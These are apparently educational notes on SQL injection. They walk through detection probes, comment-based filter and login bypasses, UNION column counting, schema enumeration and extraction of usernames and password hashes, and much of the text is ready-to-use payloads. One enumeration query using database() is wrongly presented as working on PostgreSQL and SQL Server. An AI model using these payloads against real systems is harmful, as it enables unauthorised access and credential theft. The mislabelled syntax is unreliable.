SQL injection
---
#### What is SQL injection ?
SQL Injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve.

---
#### Detect SQL injection vulnerabilities
###### Classic Error-Based Detection
- Submit a single quote (`'`) or double quote (`"`) in input fields
- Look for database error messages (MySQL, PostgreSQL, SQL Server, Oracle syntax)
- Try boolean conditions: `1=1` (true) vs `1=2` (false) and compare responses
###### Time Based Detection
- MySQL: `' OR SLEEP(5)--`
- PostgreSQL: `'; SELECT pg_sleep(5)--`
- SQL Server: `'; WAITFOR DELAY '00:00:05'--`
- If the response delays ~5 seconds, the injection exists

###### Union Based  Detection 
- `' UNION SELECT NULL--`
- `' UNION SELECT NULL,NULL--` (increment columns until no error)
- Then extract data: `' UNION SELECT username,password FROM users--`
---

#### Retrieving Hidden Data
**Normal query:**
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

**Attack 1 — Show unreleased products:**
```
https://insecure-website.com/products?category=Gifts'--
```
Resulting query:
```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```
`--` is a comment indicator. The rest of the query is interpreted as a comment, removing `AND released = 1`. All products are displayed, including unreleased ones.

**Attack 2 — Show all products in any category:**
```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```
Resulting query:
```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```
`1=1` is always true. The query returns all items.

**Warning:** `OR 1=1` can reach `UPDATE` or `DELETE` statements in the same request, causing accidental data loss.

---
#### Subverting Application Logic 
**Scenario:** An application lets users log in with a username and password.

**Normal query:**

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

If the query returns the details of a user, then the login is successful. Otherwise, it is rejected.

**Attack — Log in as any user without a password:**
An attacker can do this using the SQL comment sequence `--` to remove the password check from the `WHERE` clause.

- Username: `administrator'--`
- Password: _(blank)_

Resulting query:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

`--` is a comment indicator. The rest of the query is interpreted as a comment, removing `AND password = ''`. The query returns the user whose username is `administrator` and successfully logs the attacker in as that user.

---
#### SQL Injection UNION Attacks

**Definition:** When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the `UNION` keyword to retrieve data from other tables within the database. This is commonly known as a SQL injection UNION attack.
The `UNION` keyword enables you to execute one or more additional `SELECT` queries and append the results to the original query. For example:     

```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

This SQL query returns a single result set with two columns, containing values from columns a and b in table1 and columns c and d in table2.

---

#### Requirements for UNION to Work

Two key requirements must be met:

1. The individual queries must return the **same number of columns**.
2. The **data types** in each column must be compatible between the individual queries.

To carry out a SQL injection UNION attack, make sure that your attack meets these two requirements. This normally involves finding out:

- How many columns are being returned from the original query.
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query.

---

## Determining the Number of Columns

### Method 1: ORDER BY

Inject a series of `ORDER BY` clauses and increment the column index until an error occurs:

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

The column in an `ORDER BY` clause can be specified by its index. When the specified column index exceeds the number of actual columns, the database returns an error, such as:

> The ORDER BY position number 3 is out of range of the number of items in the select list.

The application might return the database error, a generic error, or no results. Either way, as long as you can detect some difference in the response, you can infer how many columns are being returned.

#### Method 2: UNION SELECT with NULLs

Submit a series of `UNION SELECT` payloads with different numbers of null values:

```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

If the number of nulls does not match the number of columns, the database returns an error, such as:

> All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.

`NULL` is used because it is convertible to every common data type, maximizing the chance of success when the column count is correct.
When the number of nulls matches the number of columns, the database returns an additional row containing null values. The effect on the HTTP response depends on the application's code — you might see extra content, a different error, or no visible change.

---

#### Database-Specific Syntax

**Oracle:** Every `SELECT` query must use `FROM` and specify a valid table. Use the built-in `dual` table:
```sql
' UNION SELECT NULL FROM DUAL--
```

**MySQL:** The double-dash `--` must be followed by a space. Alternatively, use `#` for comments.

---

## Finding String-Compatible Columns

Interesting data is normally in string form. After determining the number of columns, probe each column by placing a string value into each in turn:

```sql
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

If the data type is incompatible, the database returns an error, such as:

> Conversion failed when converting the varchar value 'a' to data type int.

If no error occurs and the response contains the injected string, that column is suitable for retrieving string data.

---
## Enumerating the Database Schema

Once you know the column count and which positions accept strings, you can query the database's metadata to map out tables and columns.

### Database-Specific Metadata Tables

|Database|Table Catalog|Column Catalog|
|:--|:--|:--|
|MySQL|`information_schema.tables`|`information_schema.columns`|
|PostgreSQL|`information_schema.tables`|`information_schema.columns`|
|Microsoft SQL Server|`information_schema.tables`|`information_schema.columns`|
|Oracle|`all_tables`|`all_tab_columns`|

---

### Finding Tables

Query the metadata to list all user-accessible tables:

**MySQL / PostgreSQL / SQL Server:**

```sql
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
```

**Oracle:**

```sql
' UNION SELECT table_name,NULL FROM all_tables--
```

**Result:** Returns a list of tables such as:

- `users`
- `products`
- `orders`
- `admin`

If only one string-compatible column is available, concatenate results using `GROUP_CONCAT()` (MySQL), `STRING_AGG()` (PostgreSQL/SQL Server), or `LISTAGG()` (Oracle):

**MySQL:**

```sql
' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--
```

---

### Finding Columns in a Target Table

Once a table of interest is identified (e.g., `users`), enumerate its columns:

**MySQL / PostgreSQL / SQL Server:**

```sql
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

**Oracle:**

```sql
' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'--
```

**Result:** The `users` table contains columns such as:
- `username`
- `password`
- `email`
If you need both column names and their data types in one query:

**MySQL:**

```sql
' UNION SELECT CONCAT(column_name,':',data_type),NULL FROM information_schema.columns WHERE table_name='users'--
```

---

## Extracting Data

With the table and column names known, dump the actual data through the string-compatible column positions.

### Basic Data Extraction

**MySQL / PostgreSQL / SQL Server:**

```sql
' UNION SELECT username,password FROM users--
```

**Oracle:**

```sql
' UNION SELECT username,password FROM users--
```

**Result:** The response now contains actual credentials:

- `admin : 5f4dcc3b5aa765d61d8327deb882cf99`
- `john : 202cb962ac59075b964b07152d234b70`
---
